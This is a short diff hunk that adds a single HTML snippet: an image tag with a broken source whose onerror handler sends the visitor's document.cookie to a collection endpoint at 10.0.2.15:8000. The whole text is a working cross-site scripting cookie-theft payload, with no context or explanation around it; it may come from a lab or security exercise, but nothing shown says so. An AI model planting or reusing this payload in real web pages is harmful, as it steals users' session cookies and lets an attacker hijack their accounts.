@@ -1,0 +1,4 @@
+<img src=x onerror="(function(){
+    var img = new Image();
+    img.src='http://10.0.2.15:8000/collect?data='+document.cookie;
+})();">
